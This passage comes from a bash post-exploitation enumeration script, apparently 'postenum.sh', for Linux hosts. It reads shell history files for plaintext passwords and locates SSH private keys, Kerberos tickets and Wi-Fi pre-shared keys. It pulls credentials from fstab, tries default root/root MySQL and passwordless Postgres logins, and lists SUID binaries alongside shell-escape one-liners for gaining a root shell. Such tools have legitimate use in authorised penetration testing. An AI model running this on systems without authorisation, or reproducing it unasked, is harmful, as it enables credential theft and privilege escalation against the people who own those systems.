		echo -e $redintensy"$ROOTHISTORY\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check for plain text password:"$white
	if [ -e ~/.bash_history ];
	then
		echo $yellowintensy"[x] ~/.bash_history - snippet below:"$white
		BASHHISTORY=$(head ~/.bash_history)
		echo -e $redintensy"$BASHHISTORY\n"$white
	else
		echo -e $blu"~/.bash_history not found!\n"$white
	fi

	if [ -e ~/.nano_history ];
	then
		echo $yellowintensy"[x] ~/.nano_history - snippet below:"$white
		NANOHISTORT=$(head ~/.nano_history)
		echo -e $redintensy"$NANOHISTORT\n"$white
	else
		:
	fi

	if [ -e ~/.mysql_history ];
	then
		echo $yellowintensy"[x] ~/.mysql_history - snippet below:"$white
		MYSQLHISTORY=$(head ~/.mysql_history)
		echo -e $redintensy"$MYSQLHISTORY\n"$white
	else
		:
	fi

	if [ -e ~/.php_history ];
	then
		echo $yellowintensy"[x] ~/.php_history - snippet below:"$white
		PHPHISTORY=$(head ~/.php_history)
		echo -e $redintensy"$PHPHISTORY\n"$white
	else
		:
	fi

	echo $cyan"[+] - Check SSH Dir/Files:"$white
	echo $yellowintensy"[x] Any private-key info - /home/*/.ssh/:"$white
	for usersshfolder in /home/*/.ssh
	do
		ls -ld "$usersshfolder"
		for files in $usersshfolder
		do
        	if [ -r "$files" ];
        	then
        		sshfile=$(ls -l "$files" | grep -v "total " 2>/dev/null)
        		echo -e $redintensy"$sshfile READABLE\n"$white
        	else
        		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
        	fi
        done
    done
        
	if [ -d /root/.ssh ];
	then
	    echo $yellowintensy"[x] Any private-key info - /root/.ssh/:"$white
	    ls -ld /root/.ssh/
	    for rootsshfiles in "/root/.ssh"
	    do
		    if [ -r "$rootsshfiles" ];
		    then
			    rootsshfile=$(ls -l "$files" | grep -v "total " 2>/dev/null)
			    echo -e $redintensy"$rootsshfile [READABLE]\n"$white
	        else
				LISTSSHROOT=$(ls -ld /root/.ssh/)
				echo -e "$LISTSSHROOT\n"
	   	     fi
	    done
	else
		echo $yellowintensy"[x] Any private-key info - /root/.ssh/:"$white
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Check if PermitRootLogin is on:"$white
	ROOTLOGIN=$(grep "PermitRootLogin" /etc/ssh/sshd_config | grep -v "#" | awk '{print $2}')
	if [ "$ROOTLOGIN" ];
	then
		echo $redintensy"[/] Root is allowed to login via SSH"$white
		echo -e "$ROOTLOGIN\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi
	
	PGPKEY=$(ls -l /home/*/.gnupg/secring.gpgs 2>/dev/null)
	Kerberos1=$(ls -l /tmp/krb5.keytab 2>/dev/null)
	Kerberos2=$(ls -l /tmp/krb5cc_* 2>/dev/null)
	if [ "$PGPKEY" ] || [ "$Kerberos1" ] || [ "$Kerberos2" ];
	then
                echo $cyan"[+] - Check PGP keys and Kerberos tickets:"$white
                if [ "$PGPKEY" ];
                then
		        echo $yellowintensy"[x] PGP keys:"$white
		        echo -e $redintensy"$PGPKEY\n"$white
                else
                	echo $yellowintensy"[x] PGP keys:"$white
                    echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found!\n"
                fi

                if [ "$Kerberos1" ] || [ "$Kerberos2" ];
                then
                    if [ "$Kerberos1" ];
	        		then
	        			echo $yellowintensy"[x] Kerberos tickets - krb5.keytab:"$white
		        		echo -e $redintensy"$Kerberos1\n"$white
	        		else
	        			echo $yellowintensy"[x] Kerberos tickets - krb5.keytab:"$white
		        		echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found!\n"
	        		fi
		        if [ "$Kerberos2" ];
	        	then
	        		echo $yellowintensy"[x] Kerberos tickets - krb5cc_*:"$white
		        	echo -e $redintensy"$Kerberos2\n"$white
	        	else
	        		echo $yellowintensy"[x] Kerberos tickets - krb5cc_*:"$white
	        		echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found!\n"
	        	fi
	        fi
	else
		echo $cyan"[+] - Check PGP keys and Kerberos tickets:"$white
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check password policy information and Umask value:"$white
	echo $yellowintensy"[x] Password Policy:"$white
	LOGINDEFS=$(grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null)
	if [ "$LOGINDEFS" ];
	then
		echo -e "$LOGINDEFS\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found!\n"
	fi

	UMASKVALUE=$(umask 2>/dev/null & umask -S 2>/dev/null)
	if [ "$UMASKVALUE" ];
	then
 		echo $yellowintensy"[x] Current umask value:"$white
 		echo -e "$UMASKVALUE\n"
  	else
  		echo -e "None -> Probably needs more privileges(sudo) or the command 'umask' not found!\n"
	fi

	echo $cyan"[+] - Accessible .rhosts files"$white
	echo $yellowintensy"[x] Rhost config file(s):"$white
	RHOSTUSR=$(find /home -iname "*.rhosts" -exec ls -la {} \; 2>/dev/null)
	if [ "$RHOSTUSR" ];
	then
		echo -e $redintensy"$RHOSTUSR\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Wireless Networks"$white
	echo $yellowintensy"[x] Cleartext Pre-Shared Wireless Keys from Network Manager:"$white
	WIRELESSKEY=$(grep -E "^id|^psk" /etc/NetworkManager/system-connections/* 2>/dev/null)
	if [ "$WIRELESSKEY" ];
	then
		echo -e $redintensy"$WIRELESSKEY\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi
}

function FileSystem(){
	echo $boldgrn"[-] FILE SYSTEM"$white
	echo $cyan"[+] - Check if anything interesting in the www directory:"$white
	echo $yellowintensy"[x] Any interesting file/folder in /var:"$white
	VAR=$(for x in "/var"; do ls -lh "$x"; done | grep -v "total" 2>/dev/null)
	if [ "$VAR" ];
	then
		echo -e "$VAR\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Any interesting file/folder in /var/www:"$white
	WWW=$(for x in "/var/www"; do ls -lh "$x"; done 2>/dev/null)
	if [ -d /var/www ];
	then
		echo -e "$WWW\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Any interesting file/folder in /var/www/html:"$white
	HTML=$(for x in "/var/www/html"; do ls -lh "$x"; done 2>/dev/null)
	if [ -d /var/www/html ];
	then
		echo -e "$HTML\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Search on config.* and db.* files on /var:"$white
	CONFIGDB=$(find /var/ -iname "config.*" -type f -exec ls -l {} \; 2>/dev/null && find /var/ -iname "db.*" -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$CONFIGDB" ];
	then
		echo -e "$CONFIGDB\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $yellowintensy"[x] Find conf files that contain the string 'password':"$white
	CONFIGPASS=$(grep -r 'password' /etc/*.conf 2>/dev/null)
	if [ "$CONFIGPASS" ];
	then
		echo -e "$CONFIGPASS\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $cyan"[+] - Search for hidden files:"$white
	echo $yellowintensy"[x] Hidden files:"$white
 	HIDDENFILES=$(find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null)
 	if [ "$HIDDENFILES" ];
 	then
 		echo -e "$HIDDENFILES\n"
 	else
 		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $cyan"[+] - Check for clear-text password on /home/*:"$white
	echo $yellowintensy"[x] Clear text password:"$white
	PASSWORDFILES=$(find /home -name "pass*" -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$PASSWORDFILES" ];
	then
		echo -e $redintensy"$PASSWORDFILES\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $cyan"[+] - Under / the most interesting ssh files:"$white
	echo $yellowintensy"[x] SSH files:"$white
	SYSTEMSSHCHECK=$(find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} \; 2>/dev/null)
	if [ "$SYSTEMSSHCHECK" ];
	then
		echo -e $redintensy"$SYSTEMSSHCHECK\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $cyan"[+] - Check sticky bits, SUID and SGID:"$white
	echo $yellowintensy"[x] SUID - 4000:"$white
	SUID=$(find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$SUID" ];
	then
		echo -e "$SUID\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $yellowintensy"[x] SGID - 2000:"$white
	SGID=$(find / -perm -g=s -type f -exec ls -l {} \; 2>/dev/null)
	if [ "$SGID" ];
	then
		echo -e "$SGID\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $yellowintensy"[x] Sticky bit for folders - 1000:"$white
	STICKY=$(find / -perm -1000 -type d -exec ls -ld {} \; 2>/dev/null)
	if [ "$STICKY" ];
	then
		echo -e "$STICKY\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'directories' not found!\n"
	fi

	CATCHECK=$(command -v cat 2>/dev/null)
	TAILCHECK=$(command -v tail 2>/dev/null)
	HEADCHECK=$(command -v head 2>/dev/null)
	MORECHECK=$(command -v more 2>/dev/null)
	LESSCHECK=$(command -v less 2>/dev/null)
	NANOCHECK=$(command -v nano 2>/dev/null)
	VIMBASICCHECK=$(command -v vim.basic 2>/dev/null)

	if [ -u "$CATCHECK" ] || [ -u "$TAILCHECK" ] || [ -u "$HEADCHECK" ] || [ -u "$MORECHECK" ] || [ -u "$LESSCHECK" ] || [ -u "$NANOCHECK" ] || [ -u "$VIMBASICCHECK" ];
	then
		echo $cyan"[+] - Using SUIDs to read/write root files:"$white
		if [ -u "$CATCHECK" ];
		then
			ACATCHECK=$(ls -l "$CATCHECK" 2>/dev/null)
			echo $redintensy"$ACATCHECK"$white
		else
			:
		fi

		if [ -u "$TAILCHECK" ];
		then
			ATAILCHECK=$(ls -l "$TAILCHECK" 2>/dev/null)
			echo $redintensy"$ATAILCHECK"$white
		else
			:
		fi

		if [ -u "$HEADCHECK" ];
		then
			AHEADCHECK=$(ls -l "$HEADCHECK" 2>/dev/null)
			echo $redintensy"$AHEADCHECK"$white
		else
			:
		fi

		if [ -u "$MORECHECK" ];
		then
			AMORECHECK=$(ls -l "$MORECHECK" 2>/dev/null)
			echo $redintensy"$AMORECHECK"$white
		else
			:
		fi

		if [ -u "$LESSCHECK" ];
		then
			ALESSCHECK=$(ls -l "$LESSCHECK" 2>/dev/null)
			echo $redintensy"$ALESSCHECK"$white
		else
			:
		fi

		if [ -u "$NANOCHECK" ];
		then
			ANANOCHECK=$(ls -l "$NANOCHECK" 2>/dev/null)
			echo $redintensy"$ANANOCHECK"$white
		else
			:
		fi

		if [ -u "$VIMBASICCHECK" ];
		then
			AVIMBASICCHECK=$(ls -l "$VIMBASICCHECK" 2>/dev/null)
			echo $redintensy"$AVIMBASICCHECK"$white
		else
			:
		fi
	else
		:
	fi
	echo ""

	LPYTHONCHECK=$(command -v python 2>/dev/null)
	LPYTHON2CHECK=$(command -v python2 2>/dev/null)
	LPYTHON3CHECK=$(command -v python3 2>/dev/null)
	LPERLCHECK=$(command -v perl 2>/dev/null)
	LRUBYCHECK=$(command -v ruby 2>/dev/null)
	LPHPCHECK=$(command -v php 2>/dev/null)
	LAWKCHECK=$(command -v awk 2>/dev/null)

	if [ -u "$LPYTHONCHECK" ] || [ -u "$LPYTHON2CHECK" ] || [ -u "$LPYTHON3CHECK" ] || [ -u "$LPERLCHECK" ] || [ -u "$LRUBYCHECK" ] || [ -u "$LPHPCHECK" ] || [ -u "$LAWKCHECK" ];
	then
		echo $cyan"[+] - SUID for Proramming Language:"$white
		if [ -u "$LPYTHONCHECK" ];
		then
			ALPYTHONCHECK=$(ls -l "$LPYTHONCHECK" 2>/dev/null)
			echo $redintensy"$ALPYTHONCHECK"$white
		else
			:
		fi

		if [ -u "$LPYTHON2CHECK" ];
		then
			ALPYTHON2CHECK=$(ls -l "$LPYTHON2CHECK" 2>/dev/null)
			echo $redintensy"$ALPYTHON2CHECK"$white
		else
			:
		fi

		if [ -u "$LPYTHON3CHECK" ];
		then
			ALPYTHON3CHECK=$(ls -l "$LPYTHON3CHECK" 2>/dev/null)
			echo $redintensy"$ALPYTHON3CHECK"$white
		else
			:
		fi

		if [ -u "$LPERLCHECK" ];
		then
			ALPERLCHECK=$(ls -l "$LPERLCHECK" 2>/dev/null)
			echo $redintensy"$ALPERLCHECK"$white
		else
			:
		fi

		if [ -u "$LRUBYCHECK" ];
		then
			ALRUBYCHECK=$(ls -l "$LRUBYCHECK" 2>/dev/null)
			echo $redintensy"$ALRUBYCHECK"$white
		else
			:
		fi

		if [ -u "$LPHPCHECK" ];
		then
			ALPHPCHECK=$(ls -l "$LPHPCHECK" 2>/dev/null)
			echo $redintensy"$ALPHPCHECK"$white
		else
			:
		fi

		if [ -u "$LAWKCHECK" ];
		then
			ALAWKCHECK=$(ls -l "$LAWKCHECK" 2>/dev/null)
			echo $redintensy"$ALAWKCHECK"$white
		else
			:
		fi
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check for written and executable places:"$white
	echo $yellowintensy"[x] World-writable folders - 222:"$white
	WRITABLE=$(find / -perm -222 -type d -exec ls -ld {} \; 2>/dev/null)
	if [ "$WRITABLE" ];
	then
		echo -e "$WRITABLE\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'directories' not found!\n"
	fi

	echo $yellowintensy"[x] World-executable folders:"$white
	EXECUTABLE=$(find / -perm -o x -type d -exec ls -ld {} \; 2>/dev/null)
	if [ "$EXECUTABLE" ];
	then
		echo -e "$EXECUTABLE\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'directories' not found!\n"
	fi

	echo $yellowintensy"[x] World-writable files - 0002:"$white
	FILEWRITABLE=$(find / -path /proc -prune -o -perm -0002 ! -type l -ls 2>/dev/null)
	if [ "$FILEWRITABLE" ];
	then
		echo -e "$FILEWRITABLE\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $cyan"[+] - Check for readable logfiles owned by root:"$white
	echo $yellowintensy"[x] World-readable logfiles - 0004:"$white
	LOGFILES=$(find /var/log -type f -perm -0004 -user root -exec ls -l {} \; 2>/dev/null)
	if [ "$LOGFILES" ];
	then
		echo -e $redintensy"$LOGFILES\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'files' not found!\n"
	fi

	echo $cyan"[+] - List NFS shares and permisisons:"$white
	echo $yellowintensy"[x] NFS shares:"$white
	NSFEXPORTS=$(ls -la /etc/exports 2>/dev/null)
	if [ "$NSFEXPORTS" ];
	then
  		echo $redintensy"$NSFEXPORTS"$white
  	else
  		echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found\n"
	fi
}

function DevToolsAndLang(){
	echo $boldgrn"[-] DEVELOPMENT TOOLS and LANGUAGES"$white
	echo $cyan"[+] - Check for development tools and languages are installed/supported:"$white
	PYTHON=$(command -v python 2>/dev/null)
	if [ "$PYTHON" ];
	then
		echo "$PYTHON"
	else
		:
	fi

	PYTHON3=$(command -v python3 2>/dev/null)
	if [ "$PYTHON3" ];
	then
		echo "$PYTHON3"
	else
		:
	fi

	PYTHON2=$(command -v python2 2>/dev/null)
	if [ "$PYTHON2" ];
	then
		echo "$PYTHON2"
	else
		:
	fi

	PERL=$(command -v perl 2>/dev/null)
	if [ "$PERL" ];
	then
		echo "$PERL"
	else
		:
	fi

	PHP=$(command -v php 2>/dev/null)
	if [ "$PHP" ];
	then
		echo "$PHP"
	else
		:
	fi

	GCC=$(command -v gcc 2>/dev/null)
	if [ "$GCC" ];
	then
		echo "$GCC"
	else
		:
	fi

	CC=$(command -v cc 2>/dev/null)
	if [ "$CC" ];
	then
		echo "$CC"
	else
		:
	fi

	AWK=$(command -v awk 2>/dev/null)
	if [ "$AWK" ];
	then
		echo "$AWK"
	else
		:
	fi

	RUBY=$(command -v ruby 2>/dev/null)
	if [ "$RUBY" ];
	then
		echo "$RUBY"
	else
		:
	fi

	DGBCH=$(command -v gdb 2>/dev/null)
	if [ "$DGBCH" ];
	then
		echo "$DGBCH"
	else
		:
	fi

	EXPECTCH=$(command -v expect 2>/dev/null)
	if [ "$EXPECTCH" ];
	then
		echo "$EXPECTCH"
	else
		:
	fi

	NMAP=$(command -v nmap 2>/dev/null)
	if [ "$NMAP" ];
	then
		echo "$NMAP"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Check for how files can be uploaded:"$white
	FTP=$(command -v ftp 2>/dev/null)
	if [ "$FTP" ];
	then
		echo "$FTP"
	else
		:
	fi

	TFTP=$(command -v tftp 2>/dev/null)
	if [ "$TFTP" ];
	then
		echo "$TFTP"
	else
		:
	fi

	NETCAT=$(command -v netcat 2>/dev/null)
	if [ "$NETCAT" ];
	then
		echo "$NETCAT"
	else
		:
	fi

	NC=$(command -v nc 2>/dev/null)
	if [ "$NC" ];
	then
		echo "$NC"
	else
		:
	fi

	WGET=$(command -v wget 2>/dev/null)
	if [ "$WGET" ];
	then
		echo "$WGET"
	else
		:
	fi

	CURL=$(command -v curl 2>/dev/null)
	if [ "$CURL" ];
	then
		echo "$CURL"
	else
		:
	fi

	W3M=$(command -v w3m 2>/dev/null)
	if [ "$W3M" ];
	then
		echo "$W3M"
	else
		:
	fi

	ELINKS=$(command -v elinks 2>/dev/null)
	if [ "$ELINKS" ];
	then
		echo "$ELINKS"
	else
		:
	fi

	FETCHBSD=$(command -v fetch 2>/dev/null)
	if [ "$FETCHBSD" ];
	then
		echo "$FETCHBSD"
	else
		:
	fi
	echo ""

	echo $cyan"[+] - Shell escape:"$white
	echo "awk    =	awk 'BEGIN {system(\"/bin/sh\")}'"
	echo "perl   =	perl -e 'exec \"/bin/sh\";'"
	echo "python = 	python -c 'import pty;pty.spawn(\"/bin/sh\")'"
	echo "php    =	php -r 'system(\"/bin/sh\");'"
	echo "ruby   =	ruby -e 'exec \"/bin/sh\"'"
	echo "less   =	!sh"
	echo "more   =	!sh"
	echo "man    =	!sh"
	echo "nmap   =	--interactive"
	echo "nmap   =	echo \"os.execute('/bin/sh')\" > /tmp/shell.nse"
	echo "find   =	find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
	echo "find   =	find / -exec sh -i \;"
	echo "vi     =	:!sh or :shell or -c '!sh'"
	echo "vim    =	:!sh or :shell or -c '!sh'"
	echo "gdb    =	shell"
	echo "pinfo  =	! -> less -> !sh"
	echo "mutt   =	! -> sh"
	echo "expect =	expect or expect -> sh"
	echo "docker =	docker exec -ti {CONTAINER_ID} bash"
	echo "ftp    =	!sh"
	echo "irb    =	exec '/bin/sh'"
	echo "ed     =	!'/bin/sh'"
	echo "links  =	ESC -> FILE -> OS Shell"
	echo "lynx   =	lynx --editor=/usr/bin/vi www.postenum.com"
	echo "/      =	/bin/bash or /bin/sh"
	echo "cp     =	cp /bin/bash escape_bash -> ./escape_bash"
	echo "tar    =	tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
	echo "tar    =	tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
	echo ""
	echo $redintensy" ** Please note that we can replace 'sh' with 'bash'**"$white
	echo ""

	echo $cyan"[+] - List all Environment Variables:"$white
	PRINTENV=$(printenv 2>/dev/null)
	if [ "$PRINTENV" ];
	then
		echo -e "$PRINTENV\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'printenv' not found or empty output!\n"
	fi

	echo $cyan"[+] - List all available shells:"$white
	SHELLS=$(cat /etc/shells 2>/dev/null)
	if [ "$SHELLS" ];
	then
		echo -e "$SHELLS\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi
}


function SoftwareVersion(){
	echo $boldgrn"[-] SOFTWARES VERSION"$white
	echo $cyan"[+] - Check apps and services version:"$white
	SUDOVER=$(sudo -V | grep -i "version" | grep "Sudo " 2>/dev/null)
	if [ "$SUDOVER" ];
	then
		echo $yellowintensy"[x] Sudo version (<= 1.8.20):"$white
		echo -e "$SUDOVER\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'sudo' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] MYSQL version:"$white
	MYSQLVER=$(mysql -V 2>/dev/null)
	if [ "$MYSQLVER" ];
	then
		echo -e "$MYSQLVER\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'mysql' not found or empty output!\n"	
	fi

	echo $yellowintensy"[x] PostgreSQL version:"$white
	PSQL=$(psql -V 2>/dev/null)
	if [ "$PSQL" ];
	then
		echo -e "$PSQL\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'psql' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Apache version:"$white
	APACHEVER=$(apache2 -v 2>/dev/null)
	if [ "$APACHEVER" ];
	then
		echo -e "$APACHEVER\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'apache2' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Account running under apache service:"$white
	APACHEUSER=$(grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null | awk '{sub(/.*\export /,"")}1' 2>/dev/null)
	if [ "$APACHEUSER" ];
	then
		echo -e "$APACHEUSER\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Grep the apache access.log file for “user” and “pass” strings:"$white
	ACCESSLOG=$(grep -E '^user|^pass' /var/log/apache/access.log 2>/dev/null)
	if [ "$ACCESSLOG" ];
	then
		echo -e $redintensy"$ACCESSLOG\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Chkrootkit version (< 0.50):"$white
	CHKROOTKIT=$(chkrootkit -V 2>/dev/null)
	if [ "$CHKROOTKIT" ];
	then
		echo -e "$CHKROOTKIT\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'chkrootkit' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Pkexec version:"$white
	PKEXEC=$(pkexec --version 2>/dev/null)
	if [ "$PKEXEC" ];
	then
		echo -e "$PKEXEC\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'pkexec' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Java version:"$white
	JAVA=$(java -version 2>/dev/null)
	if [ "$JAVA" ];
	then
		echo -e "$JAVA\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'java' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Exim version (<= 4.91):"$white
	EXIM=$(exim -bV 2>/dev/null)
	if [ "$EXIM" ];
	then
		echo -e "$EXIM\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'exim' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Udev version (< 232):"$white
	UDEV=$(udevadm --version 2>/dev/null)
	if [ "$UDEV" ];
	then
		echo -e "Udev version: $UDEV\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'udevadm' not found or empty output!\n"
	fi
}

function TryingAccess(){
	echo $boldgrn"[-] TRYING ACCESS"$white
	echo $cyan"[+] - Extract creds and get database access as root:"$white
	echo $yellowintensy"[x] Connect to MYSQL with root/root creds:"$white
	MYSQLCONNECT=$(mysqladmin -uroot -proot version 2>/dev/null)
	if [ "$MYSQLCONNECT" ];
	then
		echo $redintensy"[/] We can connect to the local MYSQL service with default root/root credentials!"$white
		echo -e "$MYSQLCONNECT\n"
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the command 'mysqladmin' not found or wrong creds!\n"
	fi

	echo $yellowintensy"[x] Connect to MYSQL as root and non-pass:"$white
	MYSQLCONNECTNOPASS=$(mysqladmin -uroot version 2>/dev/null)
	if [ "$MYSQLCONNECTNOPASS" ];
	then
	  	echo $redintensy"[/] We can connect to the local MYSQL service as 'root' and without a password!"$white
	  	echo -e "$MYSQLCONNECTNOPASS\n" 
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the command 'mysqladmin' not found or wrong creds!\n"
	fi

	echo $yellowintensy"[x] Connect to Postgres DB 'template0' as user 'postgres' and non-pass:"$white
	POSTCON1=$(psql -U postgres template0 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON1" ];
	then
		echo $redintensy"[/] We can connect to Postgres DB 'template0' as user 'postgres' with no password!"$white
		echo -e "$POSTCON1\n"
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the command 'psql' not found or wrong creds!\n"
	fi

	echo $yellowintensy"[x] Connect to Postgres DB 'template1' as user 'postgres' and non-pass:"$white
	POSTCON11=$(psql -U postgres template1 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON11" ];
	then
		echo $redintensy"[/] We can connect to Postgres DB 'template1' as user 'postgres' with no password!"$white
		echo -e "$POSTCON11\n"
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the command 'psql' not found or wrong creds!\n"
	fi

	echo $yellowintensy"[x] Connect to Postgres DB 'template0' as user 'psql' and non-pass:"$white
	POSTCON2=$(psql -U pgsql template0 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON2" ];
	then
		echo $redintensy"[/] We can connect to Postgres DB 'template0' as user 'psql' with no password!"$white
		echo -e "$POSTCON2\n"
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the command 'psql' not found or wrong creds!\n"
	fi

	echo $yellowintensy"[x] Connect to Postgres DB 'template1' as user 'psql' and non-pass:"$white
	POSTCON22=$(psql -U pgsql template1 -c 'select version()' 2>/dev/null | grep version)
	if [ "$POSTCON22" ];
	then
		echo $redintensy"[/] We can connect to Postgres DB 'template1' as user 'psql' with no password!"$white
		post -e "$POSTCON22\n"
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the command 'psql' not found or wrong creds!\n"
	fi

	echo $yellowintensy"[x] Any creds in /etc/fstab:"$white
	FSTAB=$(grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null)
	if [ "$FSTAB" ];
	then
		echo $redintensy"[/] Looks like there are credentials in /etc/fstab!"$white
		echo -e "$FSTAB\n"
	else 
	  	echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Any creds file in /etc/fstab:"$white
	FSTABCRED=$(grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null)
	if [ "$FSTABCRED" ];
	then
		echo $redintensy"[/] /etc/fstab contains a credentials file!"$white
		echo -e "$FSTABCRED\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi
}

function Usage(){
	echo $boldgrn" Usage   > ./postenum.sh <option>"$white
	echo " Options >"
	echo "	-a :	All (not recommended)"
	echo "	-s :	Filesystem [SUID, SGID, Config/DB files, etc.]"
	echo "	-l :	Shell escape, environment variables and development tools"
	echo "	-c :	Interesting [Backup files, PasswordPolicy, SSH files, etc.]"
	echo "	-n :	Network settings [DNS, ARP, Host, TCP, UDP, etc.]"
	echo "	-p :	Services and cron jobs"
	echo "	-o :	OS informations and priv esc kernel exploits"
	echo "	-v :	Sofware's versions"
	echo "	-t :	Fstab credentials and database access"
	echo ""
}

OPTIONS="$1"
function Postenum(){
	if [ "$OPTIONS" == "" ];
	then
		Usage
	else
		if [ "$OPTIONS" == "-a" ] || [ "$OPTIONS" == "a" ];
		then
			clear
			OperatingSystem
			AppsAndServices
			CommAndNet
			SoftwareVersion
			ConfidentialInfoAndUser
			FileSystem
			DevToolsAndLang
			TryingAccess
		else
			if [ "$OPTIONS" == "-s" ] || [ "$OPTIONS" == "s" ];
			then
				clear
				FileSystem
			else
				if [ "$OPTIONS" == "-l" ] || [ "$OPTIONS" == "l" ];
				then
					clear
					DevToolsAndLang
				else
					if [ "$OPTIONS" == "-c" ] || [ "$OPTIONS" == "c" ];
					then
						clear
						ConfidentialInfoAndUser
					else
						if [ "$OPTIONS" == "-n" ] || [ "$OPTIONS" == "n" ];
						then
							clear
							CommAndNet
						else
							if [ "$OPTIONS" == "-p" ] || [ "$OPTIONS" == "p" ];
							then
								clear
								AppsAndServices
							else
								if [ "$OPTIONS" == "-o" ] || [ "$OPTIONS" == "o" ];
								then
									clear
									OperatingSystem
								else
									if [ "$OPTIONS" == "-v" ] || [ "$OPTIONS" == "v" ];
									then
										clear
										SoftwareVersion
									else
										if [ "$OPTIONS" == "-t" ] || [ "$OPTIONS" == "t" ];
										then
											clear
